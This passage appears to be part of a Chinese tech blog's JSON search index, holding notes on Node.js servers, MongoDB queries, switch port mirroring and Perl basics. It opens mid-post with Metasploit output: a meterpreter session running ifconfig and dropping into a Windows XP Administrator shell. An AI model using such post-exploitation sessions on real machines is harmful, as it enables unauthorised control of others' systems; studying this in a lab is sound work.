&gt; ifconfigInterface 1============Name : MS TCP Loopback interfaceHardware MAC : 00:00:00:00:00:00MTU : 1520IPv4 Address : 127.0.0.1Interface 2============Name : AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler MiniportHardware MAC : 00:0c:29:84:07:87MTU : 1500IPv4 Address : 192.168.1.43IPv4 Netmask : 255.255.255.0meterpreter &gt; shellProcess 204 created.Channel 1 created.Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\Documents and Settings\\Administrator\\Desktop&gt;","tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"},{"name":"Metasploit","slug":"Metasploit","permalink":"http://yoursite.com/tags/Metasploit/"}]},{"title":"Node.js学习笔记","date":"2016-06-03T14:00:33.000Z","path":"others/Node-js学习笔记/","text":"新建http服务1234567891011var http = require('http');http.createServer(function (request, response) &#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; console.log('访问'); response.write('hello,world'); response.end(\"response.end\"); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); 使用function 目录结构 tp@V:/mnt/d/Node.js$ tree.├── hello.js├── models│ └── otherfuns.js└── n2_funcall.jsn2_funcall.js 12345678910111213var http = require('http');var otherfun = require(\"./models/otherfuns.js\");http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; otherfun['fun3'](response); otherfun['fun2'](response);//也可以用otherfun.fun2(response) response.end(\"response.end\"); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); otherfuns.js 12345678910module.exports=&#123; fun2:function(res)&#123; console.log(\"我是fun2\"); res.write(\"Hello, I am fun2\"); &#125;, fun3:function(res)&#123; console.log(\"I am fun3\"); res.write(\"Hello, I am fun3\"); &#125;&#125; 效果 使用模块 models/User.js 123456789function User(id, name, age)&#123; this.id=id; this.name=name; this.age=age; this.enter=function()&#123; console.log(this.name+\"进入图书馆\"); &#125;&#125;module.exports = User; models/Teacher.js1234567891011var User = require('./User');function Teacher(id,name,age)&#123; User.apply(this,[id,name,age]); this.teach=function(res)&#123; res.write(this.name+\"讲课\"); &#125;&#125;module.exports = Teacher;```JavaScript&gt;n3_modelcall.js var http = require(‘http’); // var User = require(“./models/User”);var Teacher = require(“./models/Teacher”) http.createServer(function (request, response){ response.writeHead(200, {‘Content-Type’: ‘text/html; charset=utf-8’}); if(request.url!==”/favicon.ico”){ //funname = ‘fun3’; teacher = new Teacher(1,’我来’,18); // user.id =1; // user.name=’我来’; // user.age=18; teacher.enter(); teacher.teach(response); response.end(“response.end”); } }).listen(8000);console.log(“Server running at http://127.0.0.1:8000/“);1234567891011121314![](https://ww2.sinaimg.cn/large/006tNc79gy1fdtdb7fgu8j30b8058gln.jpg)# 使用路由&gt;models/route.js```JavaScriptmodule.exports=&#123; login:function(req, res)&#123; res.write(&quot;I am login module.&quot;); &#125;, admin:function(req, res)&#123; res.write(&quot;I am admin module.&quot;); &#125;&#125; n4_rout.js1234567891011121314151617var http = require('http');var url = require('url');var router = require('./models/route');http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; var pathname = url.parse(request.url).pathname; pathname = pathname.replace(/\\//, ''); console.log(pathname); router[pathname](request, response); response.end(\"response.end\"); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); 读文件 models/route.js 1234567891011121314151617var optfile = require('./optfile');module.exports=&#123; login:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/login.html', recall); &#125;, admin:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/admin.html', recall); &#125;&#125; models/optfile.js1234567891011121314151617181920var fs = require('fs');module.exports = &#123; readfileSync:function(path)&#123;//同步读取 var data = fs.readFileSync(path, 'utf-8'); console.log(data); console.log('同步方法执行完毕'); &#125;, readfile:function(path, recall)&#123;//异步读取 fs.readFile(path, function(err, data)&#123; if(err)&#123; console.log(err); &#125;else&#123; console.log(data.toString()); recall(data); &#125; &#125;); console.log('异步方法执行完毕');&#125;&#125; n5_readfile.js123456789101112131415161718var http = require('http');var url = require('url');var router = require('./models/route');//var optfile = require('./models/optfile');http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; var pathname = url.parse(request.url).pathname; pathname = pathname.replace(/\\//, ''); console.log(pathname); router[pathname](request, response); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); views/login.html1This is login page. views/admin.html1This is admin page. 写文件 models/optfile.js1234567891011121314151617var fs = require('fs');module.exports = &#123; writefile:function(path, data, recall)&#123;//异步方式 fs.writeFile(path, data, function (err)&#123; if (err)&#123; throw err; &#125; console.log('It\\'s Saved!');//文件被保存 recall(\"write file success.\"); &#125;); &#125;, writeFileSync:function(path, data)&#123;//同步方式 fs.writeFileSync(path, data); console.log(\"同步写文件完成\"); &#125;&#125; models/route.js123456789101112131415161718192021222324var optfile = require('./optfile');module.exports=&#123; login:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/login.html', recall); &#125;, admin:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/admin.html', recall); &#125;, writefile:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.writefile('./views/test.txt', 'write file ok1.', recall); &#125;&#125; n6_writefile.js123456789101112131415161718var http = require('http');var url = require('url');var router = require('./models/route');//var optfile = require('./models/optfile');http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; var pathname = url.parse(request.url).pathname; pathname = pathname.replace(/\\//, ''); console.log(pathname); router[pathname](request, response); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); 读取图片 models/optfile.js仅能显示图片12345678910111213141516var fs = require('fs');module.exports = &#123; readImg:function(path, res)&#123; fs.readFile(path, 'binary', function(err, file)&#123; if (err)&#123; console.log(err); return; &#125;else&#123; console.log('输出文件'); res.write(file, 'binary'); res.end(); &#125; &#125;); &#125;&#125; n7_readimg.js1234567891011121314var http = require('http');var optfile = require('./models/optfile');http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'image/jpeg'&#125;); if(request.url!==\"/favicon.ico\")&#123; console.log('访问'); optfile.readImg('./images/1.png', response); console.log(\"move on\"); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); 路由改造 models/optfile.js可显示文本和图片12345678910111213141516171819202122232425262728293031323334353637383940var fs = require('fs');module.exports = &#123; writefile:function(path, data, recall)&#123;//异步方式 fs.writeFile(path, data, function (err)&#123; if (err)&#123; throw err; &#125; console.log('It\\'s Saved!');//文件被保存 recall(\"write file success.\"); &#125;); &#125;, writeFileSync:function(path, data)&#123;//同步方式 fs.writeFileSync(path, data); console.log(\"同步写文件完成\"); &#125;, readImg:function(path, res)&#123; fs.readFile(path, 'binary', function(err, file)&#123; if (err)&#123; console.log(err); return; &#125;else&#123; console.log('输出文件'); res.write(file, 'binary'); res.end(); &#125; &#125;); &#125;, readfile:function(path, recall)&#123;//异步读取 fs.readFile(path, function(err, data)&#123; if(err)&#123; console.log(err); &#125;else&#123; console.log(data.toString()); recall(data); &#125; &#125;); console.log('异步方法执行完毕');&#125;,&#125; models/route.js 12345678910111213141516171819202122232425262728293031323334var optfile = require('./optfile');function getRecall(req, res)&#123; res.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); function recall(data)&#123; res.write(data); res.end(\" \"); &#125; return recall;&#125;module.exports=&#123; login:function(req, res)&#123; recall = getRecall(req, res); optfile.readfile('./views/login.html', recall); &#125;, admin:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/admin.html', recall); &#125;, writefile:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.writefile('./views/test.txt', 'write file ok1.', recall); &#125;, showimg:function(req, res)&#123; res.writeHead(200, &#123;'Content-Type': 'image/jpeg'&#125;); optfile.readImg('./images/1.png', res); &#125;&#125; n8_routhtml.js123456789101112131415var http = require('http');var url = require('url');var router = require('./models/route');http.createServer(function (request, response)&#123; if(request.url!==\"/favicon.ico\")&#123; var pathname = url.parse(request.url).pathname; pathname = pathname.replace(/\\//, ''); console.log(pathname); router[pathname](request, response); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\");","tags":[{"name":"Perl","slug":"Perl","permalink":"http://yoursite.com/tags/Perl/"}]},{"title":"MongoDB 基本操作","date":"2016-05-20T03:23:14.000Z","path":"db/MongoDB-基本操作/","text":"基本操作基本查询 以更美观的方式输出 1db.number.find().pretty() 获取数据库的所有聚合名称12&gt; db.getCollectionNames();[ &quot;phone_number&quot;, &quot;system.indexes&quot; ] 统计数据库特定聚合所有记录数量12db.phone_number.count()16119524 获取数据库特定聚合的索引 比如获取phone_number聚合的所有索引1234567891011&gt; db.phone_number.getIndexes()[ &#123; &quot;v&quot; : 1, &quot;key&quot; : &#123; &quot;_id&quot; : 1 &#125;, &quot;name&quot; : &quot;_id_&quot;, &quot;ns&quot; : &quot;blacklist.phone_number&quot; &#125;] 添加索引 为phone_number的phone字段添加索引1234567&gt; db.phone_number.ensureIndex(&#123;&quot;phone&quot;:1&#125;)&#123; &quot;createdCollectionAutomatically&quot; : false, &quot;numIndexesBefore&quot; : 1, &quot;numIndexesAfter&quot; : 2, &quot;ok&quot; : 1&#125; 再查看索引情况验证一下12345678910111213141516171819&gt; db.phone_number.getIndexes()[ &#123; &quot;v&quot; : 1, &quot;key&quot; : &#123; &quot;_id&quot; : 1 &#125;, &quot;name&quot; : &quot;_id_&quot;, &quot;ns&quot; : &quot;blacklist.phone_number&quot; &#125;, &#123; &quot;v&quot; : 1, &quot;key&quot; : &#123; &quot;phone&quot; : 1 &#125;, &quot;name&quot; : &quot;phone_1&quot;, &quot;ns&quot; : &quot;blacklist.phone_number&quot; &#125;] 分组查询group count123456789101112131415161718192021&gt; db.phone.aggregate([&#123;$group:&#123;_id:&quot;$source&quot;, num_tutorial:&#123;$sum:1&#125;&#125;&#125;])&#123; &quot;_id&quot; : &quot;youm&quot;, &quot;num_tutorial&quot; : 449 &#125;&#123; &quot;_id&quot; : &quot;tianma168&quot;, &quot;num_tutorial&quot; : 349 &#125;&#123; &quot;_id&quot; : &quot;dingdkj&quot;, &quot;num_tutorial&quot; : 3259 &#125;&#123; &quot;_id&quot; : &quot;ypyun&quot;, &quot;num_tutorial&quot; : 10192 &#125;&#123; &quot;_id&quot; : &quot;ilezan&quot;, &quot;num_tutorial&quot; : 43685 &#125;&#123; &quot;_id&quot; : &quot;ism168&quot;, &quot;num_tutorial&quot; : 2856 &#125;&#123; &quot;_id&quot; : &quot;iyylw&quot;, &quot;num_tutorial&quot; : 16284 &#125;&#123; &quot;_id&quot; : &quot;iqiyi&quot;, &quot;num_tutorial&quot; : 1 &#125;&#123; &quot;_id&quot; : &quot;xudan123.com&quot;, &quot;num_tutorial&quot; : 74808 &#125;&#123; &quot;_id&quot; : &quot;vim6&quot;, &quot;num_tutorial&quot; : 26927 &#125;&#123; &quot;_id&quot; : &quot;yzm1&quot;, &quot;num_tutorial&quot; : 449854 &#125;&#123; &quot;_id&quot; : &quot;feiq&quot;, &quot;num_tutorial&quot; : 46670 &#125;&#123; &quot;_id&quot; : &quot;83r.com&quot;, &quot;num_tutorial&quot; : 144898 &#125;&#123; &quot;_id&quot; : &quot;maz8&quot;, &quot;num_tutorial&quot; : 81461 &#125;&#123; &quot;_id&quot; : &quot;kuaima9&quot;, &quot;num_tutorial&quot; : 138903 &#125;&#123; &quot;_id&quot; : &quot;bmyzm&quot;, &quot;num_tutorial&quot; : 6015 &#125;&#123; &quot;_id&quot; : &quot;sunvarma.com&quot;, &quot;num_tutorial&quot; : 45164 &#125;&#123; &quot;_id&quot; : &quot;ema6&quot;, &quot;num_tutorial&quot; : 54819 &#125;&#123; &quot;_id&quot; : &quot;yma0.com&quot;, &quot;num_tutorial&quot; : 417669 &#125;&#123; &quot;_id&quot; : &quot;creditease&quot;, &quot;num_tutorial&quot; : 101747 &#125; 如果需要排序的话123456789101112131415161718192021&gt; db.phone.aggregate([&#123;$group:&#123;_id:&quot;$source&quot;, count:&#123;$sum:1&#125;&#125;&#125;,&#123;$sort:&#123;&quot;count&quot;:-1&#125;&#125;])&#123; &quot;_id&quot; : &quot;other&quot;, &quot;count&quot; : 6133225 &#125;&#123; &quot;_id&quot; : &quot;ly.com&quot;, &quot;count&quot; : 5235378 &#125;&#123; &quot;_id&quot; : &quot;zmyzm.com&quot;, &quot;count&quot; : 1038465 &#125;&#123; &quot;_id&quot; : &quot;f02.cn&quot;, &quot;count&quot; : 644959 &#125;&#123; &quot;_id&quot; : &quot;shjmpt.com&quot;, &quot;count&quot; : 502440 &#125;&#123; &quot;_id&quot; : &quot;yzm1&quot;, &quot;count&quot; : 449854 &#125;&#123; &quot;_id&quot; : &quot;yma0.com&quot;, &quot;count&quot; : 417669 &#125;&#123; &quot;_id&quot; : &quot;6yzm.com&quot;, &quot;count&quot; : 297152 &#125;&#123; &quot;_id&quot; : &quot;taomapt.com&quot;, &quot;count&quot; : 187613 &#125;&#123; &quot;_id&quot; : &quot;83r.com&quot;, &quot;count&quot; : 144898 &#125;&#123; &quot;_id&quot; : &quot;kuaima9&quot;, &quot;count&quot; : 138903 &#125;&#123; &quot;_id&quot; : &quot;creditease&quot;, &quot;count&quot; : 101747 &#125;&#123; &quot;_id&quot; : &quot;tongdun&quot;, &quot;count&quot; : 95012 &#125;&#123; &quot;_id&quot; : &quot;aliqin&quot;, &quot;count&quot; : 87845 &#125;&#123; &quot;_id&quot; : &quot;maz8&quot;, &quot;count&quot; : 81461 &#125;&#123; &quot;_id&quot; : &quot;xudan123.com&quot;, &quot;count&quot; : 74808 &#125;&#123; &quot;_id&quot; : &quot;ema6&quot;, &quot;count&quot; : 54819 &#125;&#123; &quot;_id&quot; : &quot;feiq&quot;, &quot;count&quot; : 46670 &#125;&#123; &quot;_id&quot; : &quot;sunvarma.com&quot;, &quot;count&quot; : 45164 &#125;&#123; &quot;_id&quot; : &quot;yayayama.com&quot;, &quot;count&quot; : 44941 &#125; MongoDB 唯一索引自动删除重复记录123456coll.ensureIndex(&#123;productid:1&#125;) // 在productid上建立普通索引coll.ensureIndex(&#123;district:1, plate:1&#125;) // 多字段索引coll.ensureIndex(&#123;productid:1&#125;, &#123;unique:true&#125;) // 唯一索引coll.ensureIndex(&#123;productid:1&#125;, &#123;unique:true, dropDups:true&#125;) // 建索引时，如果遇到索引字段值已经出现过的情况，则删除重复记录coll.getIndexes() // 查看索引coll.dropIndex(&#123;productid:1&#125;) // 删除单个索 Python 相关12345678910111213141516171819202122232425262728293031323334import requestsimport jsonfrom datetime import datetimefrom pymongo import MongoClient&apos;&apos;&apos;连接到mongodb数据库&apos;&apos;&apos;# 使用默认链接client = MongoClient()# 数据库名为gznu_all_student_infodb = client.gznu_all_student_info# 数据库中相关表记录# 学院相关信息college_collection = db.college# 班级相关信息class_collection = db.class_all_class_collection = db.all_class# 学生信息students_collection = db.studentsdef _save_class_code(url, college_code): &apos;&apos;&apos;将班级信息保持到数据库中&apos;&apos;&apos; print &apos;[*] 正在将班级&#123;&#125;信息保存到数据库中&apos;.format(college_code) info = get_info(url) for i in json.loads(info): for j in i[&apos;children&apos;]: item = &#123;&#125; item[&apos;class_code&apos;] = j[&apos;id&apos;] item[&apos;text&apos;] = j[&apos;text&apos;] item[&apos;college_code&apos;] = college_code item[&apos;update&apos;] = datetime.now() class_collection.insert(item) mongodb.config12345678port=27017dbpath=/data/db/fork=truelogpath=/data/logs/mongodb.loglogappend=truenoauth=truenohttpinterface=truerest=false 导入json文件数据将json数据导入到blacklist的phone_number集合中1mongoimport -h 127.0.0.1 -d blacklist -c phone_number --file blacklist3.json","tags":[{"name":"数据库","slug":"数据库","permalink":"http://yoursite.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://yoursite.com/tags/MongoDB/"}]},{"title":"旁路镜像、端口镜像、旁路监控","date":"2016-03-20T02:27:03.000Z","path":"server/旁路镜像、端口镜像、旁路监控/","text":"常见的网络监控模式可以分为两种 一种是旁路监控模式 另一种是串联监控模式。 1“旁路监控模式”一般是指通过交换机等网络设备的“端口镜像”功能来实现监控，在此模式下，监控设备只需要连接到交换机的指定镜像端口，所以形象的称之为“旁路监控”。 1而串联模式一般是通过网关、网桥或者代理服务器的模式来进行监控，由于监控设备做为网关或者网桥串联在网络中，所以称之为“串联监控模式”。 旁路模式的优缺点 优点：123旁路监控模式部署起来比较灵活方便，只需要在交换机上面配置镜像端口即可。不会影响现有的网络结构。而串联模式一般要作为网关、网桥或者代理服务器，所以需要对现有网络结构进行变动。旁路模式分析的是镜像端口拷贝过来的数据，对原始传递的数据包不会造成延时，不会对网速造成任何影响。而串联模式是串联在网络中的，那么所有的数据必须先经过监控系统，通过监控系统的分析检查之后，才能够发送到各个客户端，所以会对网速有一定的延时。旁路监控设备一旦故障或者停止运行，不会影响现有网络。而串联监控设备如果出现故障，会导致网络中断。 缺点：12需要交换机或者路由支持“端口镜像”功能才可以实现监控。旁路模式采用发送RST包的方式来断开TCP连接，不能禁止UDP通讯。对于UDP应用，一般还需要在路由器上面禁止UDP端口进行配合。而串联模式不存在该问题。 串联模式的优缺点 优点：12利用windows自带的“网关”、“网桥”功能即可实现，不需要硬件设备的支持。可以禁止UDP通讯数据包。 缺点：123需要更改现有的网络结构。与“旁路监控”相比较，“网关”、“网桥”的配置更加复杂些。由于是串联模式，当局域网电脑台数多时，对网速有少许的影响。这个主要取决于电脑的硬件配置。 交换机镜像端口配置 用户模式：查看初始化相关信息特权模式：查看所有信息、调试、保持配置信息全局模式：配置所有信息、针对整个路由器或交换机的所有接口接口模式：针对某一个接口的配置线控模式：对路由器进行控制的接口配置 1234567sw-1#show monitor 检查是否已存在镜像的配置sw-1#conf t 进入全局模式sw-1&lt;config&gt;#monitor session 2 source int f0/12 both 监控端口f0/12（外网口或叫被镜像端口） both代表双向监听数据 rx代表接收数据 tx代表发送数据sw-1&lt;config&gt;#monitor session 2 destination int f0/24 把信息复制到f0/24（镜像端口）sw-1&lt;config&gt;#end 返回sw-1#show monitor session 2把F0/12 进来的出去的数据复制一份给F0/24，这样我们在晟为就可以截取到数据了。","tags":[{"name":"服务器","slug":"服务器","permalink":"http://yoursite.com/tags/服务器/"},{"name":"流量控制","slug":"流量控制","permalink":"http://yoursite.com/tags/流量控制/"}]},{"title":"Perl 学习笔记","date":"2015-08-10T03:25:03.000Z","path":"others/Perl-学习笔记/","text":"交互式环境123456➜ ~ perl -eNo code specified for -e.➜ ~ perl -e &apos;print &quot;Hello World&quot;&apos;Hello World% ➜ ~ perl -e &apos;print &quot;Hello World\\n&quot;&apos;Hello World 脚本式编程与注射123456789101112#!/usr/bin/perl##This is single-line comments.print \"Hello, World\\n\";=pod commentsThis is multiline commentThis is multiline commentThis is multiline commentThis is multiline comment=cut 数据类型 Perl 是一种弱类型语言，所以变量不需要指定类型，Perl 解释器会根据上下文自动选择匹配类型。三个基本的数据类型：标量、数组、哈希Perl 为每个变量类型设置了独立的命令空间，所以不同类型的变量可以使用相同的名称，如 $foo 和 @foo 是两个不同的变量。 标量在变量名前加$表示是标量12345#number$my_number=123;#string$my_str=&quot;123&quot;; 标量运算 .可以用来链接两个标量1print ( &quot;$my_number . $my_str\\n&quot;); 特殊字符 分别表示当前执行脚本的文件名，行号，包名。这些特殊字符是单独的标记，不能写在字符串中123print &quot;FileName:&quot; . &quot;\\t&quot;.__FILE__.&quot;\\n&quot;;print &quot;LineNumber:&quot; . &quot;\\t&quot;.__LINE__.&quot;\\n&quot;;print &quot;PackageName:&quot; . &quot;\\t&quot;.__PACKAGE__.&quot;\\n&quot;; 123FileName: run.plLineNumber: 28PackageName: main 数组 数组变量以字符”@”开头，索引从0开始也可以以 qw 开始定义数组 123@arr=(2,3,5);print @arr[2];@array = qw/这是 一个 数组/; 数组序列号12➜ ~ perl -e &quot;print(&quot;1..10&quot;,&quot;\\n&quot;)&quot;12345678910n% 哈希 哈希是一个无序的 key/value 对集合。可以使用键作为下标获取值类似Python的字典123%hash=(&apos;name&apos;=&gt;&apos;LongLi&apos;,&apos;age&apos;=&gt;18);print (%hash&#123;&apos;name&apos;&#125;, &quot;\\n&quot;);print (%hash&#123;&apos;age&apos;&#125;, &quot;\\n&quot;); 1234➜ test ./run.pl Hello, WorldnameLongLiage18","tags":[{"name":"Perl","slug":"Perl","permalink":"http://yoursite.com/tags/Perl/"}]}]